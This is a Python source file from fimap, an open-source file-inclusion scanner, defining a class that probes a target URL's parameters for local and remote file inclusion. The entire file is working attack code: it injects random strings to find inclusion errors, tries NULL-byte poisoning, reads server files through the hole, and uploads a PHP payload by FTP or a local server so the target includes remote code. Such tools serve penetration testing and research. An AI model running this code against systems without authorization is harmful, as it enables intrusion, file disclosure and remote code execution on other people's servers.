#
# This file is part of fimap.
#
# Copyright(c) 2009 Iman Karim(ikarim2s@smail.inf.fh-brs.de).
# http://fimap.googlecode.com
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#

from config import settings
import incinfo
import baseClass
from report import report
import re,os

__author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
__date__ ="$30.08.2009 19:59:44$"

INCLUDE_ERR_MSG = "Failed opening( required)* '[\d\w/\.\-]*?%s[\d\w/\.\-]*?' (for inclusion)*"
SCRIPTPATH_ERR_MSG = "\\(include_path='.*?'\\) in <b>(.*?)</b> on line"


class targetScanner (baseClass.baseClass):

    def _load(self):
        self.INC_SUCCESS_MSG = "for inclusion (include_path="



        self._log("TargetScanner loaded.", self.globSet.LOG_DEBUG)
        self.params = {}

    def prepareTarget(self):
        self.Target_URL = self.globalSettings().getTargetURL()

        self._log("Parsing URL '%s'..."%(self.Target_URL), self.globSet.LOG_ALWAYS)

        if (self.Target_URL.find("?") == -1):
            self._log("Target URL doesn't have any params.", self.globSet.LOG_DEBUG);
            return(False);

        data = self.Target_URL.split("?")[1]
        if (data.find("&") == -1):
            self.__addToken(data)
        else:
            for ln in data.split("&"):
                self.__addToken(ln)

        return(len(self.params)>0)

    def testTargetVuln(self):
        ret = []

        self._log("Fiddling around with URL...", self.globSet.LOG_INFO)

        for k,v in self.params.items():
            tmpurl = self.Target_URL
            rndStr = self.getRandomStr()
            tmpurl = tmpurl.replace("%s=%s"%(k,v), "%s=%s"%(k, rndStr))
            self._log("Requesting: '%s'..." %(tmpurl), self.globSet.LOG_DEBUG)
            code = self.doGetRequest(tmpurl)
            if (code != None):
                RE_SUCCESS_MSG = re.compile(INCLUDE_ERR_MSG%(rndStr), re.DOTALL)
                m = RE_SUCCESS_MSG.search(code)
                if (m != None):
                    self._log("Possible file inclusion found! -> '%s' with Parameter '%s'." %(tmpurl, k), self.globSet.LOG_ALWAYS)
                    info = incinfo.incinfo(self.Target_URL, self.params, k)
                    self._writeToLog("POSSIBLE ; %s ; %s"%(self.Target_URL, k))
                    rep = self.identifyVuln(self.Target_URL, self.params, k)
                    if (rep != None):
                        rep.setVulnKeyVal(v)
                        ret.append((rep, self.readFiles(rep)))

                RE_SUCCESS_MSG = re.compile("<b>Warning</b>:  file\(.*?%s.*?\)*"%(rndStr), re.DOTALL)
                m = RE_SUCCESS_MSG.search(code)
                if (m != None):
                    self._log("Possible local file disclose found! -> '%s' with Parameter '%s'. (IDENTIFY DISABLED IN THIS VERSION)"%(tmpurl, k), self.globSet.LOG_ALWAYS)
                    #self.identifyReadFile(URL, Params, VulnParam)
                    self._writeToLog("READ ; %s ; %s"%(tmpurl, k))
        return(ret)



    def identifyVuln(self, URL, Params, VulnParam, identifyMode="inc"):
        # identify Mode can be set to 'inc' for inclusion check or to 'read' for read file check.

        self._log("Identifing Vulnerability '%s' with Param '%s'..."%(URL, VulnParam), self.globSet.LOG_ALWAYS)
        tmpurl = URL
        rndStr = self.getRandomStr()
        tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s"%(VulnParam, rndStr))

        RE_SUCCESS_MSG = re.compile(INCLUDE_ERR_MSG%(rndStr), re.DOTALL)

        code = self.doGetRequest(tmpurl)
        m = RE_SUCCESS_MSG.search(code)
        if (code == None or m == None):
            self._log("Identifing of vulerability failed.", self.globSet.LOG_ERROR)
            return None


        r = report(URL, Params, VulnParam)

        RE_SCRIPT_PATH = re.compile(SCRIPTPATH_ERR_MSG, re.DOTALL)
        s = RE_SCRIPT_PATH.search(code)
        if (s == None):
            self._log("Failed to retrieve script path.", self.globSet.LOG_WARN)
        else:
            script = code[s.start(): s.end()]
            script = script[script.find("<b>")+3: script.find("</b>")]
            if (script != None and script[1] == ":"): # Windows detection quick hack
                scriptpath = script[:script.rfind("\\")]
                r.setWindows()
            else:
                scriptpath = os.path.dirname(script)
            self._log("Scriptpath received: '%s'" %(scriptpath), self.globSet.LOG_INFO)
            r.setServerPath(scriptpath)
            r.setServerScript(script)


        if (r.isWindows()):
            self._log("Windows servers are currently not supported. Skipping it...", self.globSet.LOG_WARN)
            return(None)


        errmsg = code[m.start(): m.end()]
        errmsg = errmsg[errmsg.find("'")+1:errmsg.rfind("'")]
        
        if (errmsg == rndStr):
            r.setPrefix("")
            r.setSurfix("")
        else:
            tokens = errmsg.split(rndStr)
            pre = tokens[0]
            addSlash = False
            if (pre == ""):
                pre = "/"
            #else:
            #    if pre[-1] != "/":
            #       addSlash = True

            if (pre[0] != "/"):
                pre = os.path.join(r.getServerPath(), pre)
            pre = self.relpath("/", pre)
            if addSlash: pre = "/" + pre
            sur = tokens[1]
            if (pre == "."): pre = ""
            r.setPrefix(pre)
            r.setSurfix(sur)

            if (sur != ""):
                self._log("Trying NULL-Byte Poisoning to get rid of the suffix...", self.globSet.LOG_INFO)
                tmpurl = URL
                tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
                code = self.doGetRequest(tmpurl)
                if (code == None):
                    self._log("NULL-Byte testing failed.", self.globSet.LOG_ERROR)
                    return(None)
                if (code.find("%s\\0%s"%(rndStr, sur)) != -1 or code.find("%s%s"%(rndStr, sur)) != -1):
                    self._log("NULL-Byte Poisoning not possible.", self.globSet.LOG_INFO)
                    r.setNullBytePossible(False)
                else:
                    self._log("NULL-Byte Poisoning successfull!", self.globSet.LOG_INFO)
                    r.setSurfix("%00");
                    r.setNullBytePossible(True)


        return(r)





    def readFiles(self, rep):
        files     = settings["files"]
        abs_files = settings["filesabs"]
        rmt_files = settings["filesrmt"]
        rfi_mode = settings["dynamic_rfi"]["mode"]

        ret = []
        self._log("Testing default files...", self.globSet.LOG_DEBUG)

        

        for f,p,type in files:
            if ((rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
                if (self.readFile(rep, f, p)):
                    ret.append(f)
                    self.addXMLLog(rep, type, f)
                else:
                    pass
            else:
                self._log("Skipping file '%s'."%f, self.globSet.LOG_INFO)

        self._log("Testing absolute files...", self.globSet.LOG_DEBUG)
        for f,p,type in abs_files:
            if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
                if (self.readFile(rep, f, p, True)):
                    ret.append(f)
                    self.addXMLLog(rep, type, f)
                else:
                    pass
            else:
                self._log("Skipping absolute file '%s'."%f, self.globSet.LOG_INFO)


        if (rfi_mode in ("ftp", "local")):
            if (rfi_mode == "ftp"): self._log("Testing remote inclusion dynamicly with FTP...", self.globSet.LOG_INFO)
            if (rfi_mode == "local"): self._log("Testing remote inclusion dynamicly with local server...", self.globSet.LOG_INFO)
            if (rep.getPrefix() == ""):
                fl = up = None
                if (rfi_mode == "ftp"):
                    fl = settings["dynamic_rfi"]["ftp"]["ftp_path"] + rep.getAppendix()
                    up = self.FTPuploadFile(settings["php_info"][0], rep.getAppendix())
                elif(rfi_mode == "local"):
                    fl = settings["dynamic_rfi"]["local"]["local_path"] + rep.getAppendix()
                    up = {}
                    up["local"] = fl
                    up["http"] = settings["dynamic_rfi"]["local"]["http_map"] + rep.getAppendix()
                    f = open(up["local"], "w")
                    f.write(settings["php_info"][0])
                    f.close()

                if (self.readFile(rep, up["http"], settings["php_info"][1], True)):
                    ret.append(up["http"])
                    rep.setRemoteInjectable(True)
                    self.addXMLLog(rep, "rxR", up["http"])

                if (rfi_mode == "ftp"): self.FTPdeleteFile(up["ftp"])
                if (rfi_mode == "local"): os.remove(up["local"])
        else:
            self._log("Testing remote inclusion...", self.globSet.LOG_DEBUG)
            for f,p,type in rmt_files:
                if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
                    if ((not rep.isNullbytePossible() and not rep.getSurfix() == "") and f.endswith(rep.getSurfix())):
                        f = f[:-len(rep.getSurfix())]
                        rep.setSurfix("")

                    if (self.readFile(rep, f, p, True)):
                        ret.append(f)
                        rep.setRemoteInjectable(True)
                        self.addXMLLog(rep, type, f)
                    else:
                        pass
                else:
                    self._log("Skipping remote file '%s'."%f, self.globSet.LOG_INFO)

        self.saveXML()
        return(ret)


    def readFile(self, report, filepath, filepattern, isAbs=False):
        self._log("Testing file '%s'..." %filepath, self.globSet.LOG_INFO)
        tmpurl = report.getURL()
        prefix = report.getPrefix()
        surfix = report.getSurfix()
        vuln   = report.getVulnKey()
        params = report.getParams()
        scriptpath = report.getServerPath()

        filepatha = ""
        if (prefix != None and prefix != "" and prefix[-1] == "/"):
            prefix = prefix[:-1]
            report.setPrefix(prefix)

        if (filepath[0] == "/"):
            filepatha = prefix + filepath
        elif len(prefix.strip()) > 0 and not isAbs:
            filepatha = prefix + "/" +filepath
        else:
            filepatha = filepath

        if (scriptpath[-1] != "/" and filepatha[0] != "/" and not isAbs):
            filepatha = "/" + filepatha

        payload = "%s%s"%(filepatha, surfix)
        tmpurl = tmpurl.replace("%s=%s" %(vuln, params[vuln]), "%s=%s"%(vuln, payload))

        self._log("Testing URL: " + tmpurl, self.globSet.LOG_DEBUG)

        RE_SUCCESS_MSG = re.compile(INCLUDE_ERR_MSG %(filepath), re.DOTALL)
        code = self.doGetRequest(tmpurl)

        if (code == None):
            return(False)

        m = RE_SUCCESS_MSG.search(code)
        if (m == None):
            if (filepattern == None or code.find(filepattern) != -1):
                #self._writeToLog("VULN;%s;%s;%s;%s"%(tmpurl, vuln, payload, filepath))
                return(True)

        return(False)

    def __addToken(self, token):
        if (token.find("=") == -1):
            self.params[token] = ""
            self._log("Token found: [%s] = none" %(token), self.globSet.LOG_DEBUG)
        else:
            k = token.split("=")[0]
            v = token.split("=")[1]
            self.params[k] = v
            self._log("Token found: [%s] = [%s]" %(k,v), self.globSet.LOG_DEBUG)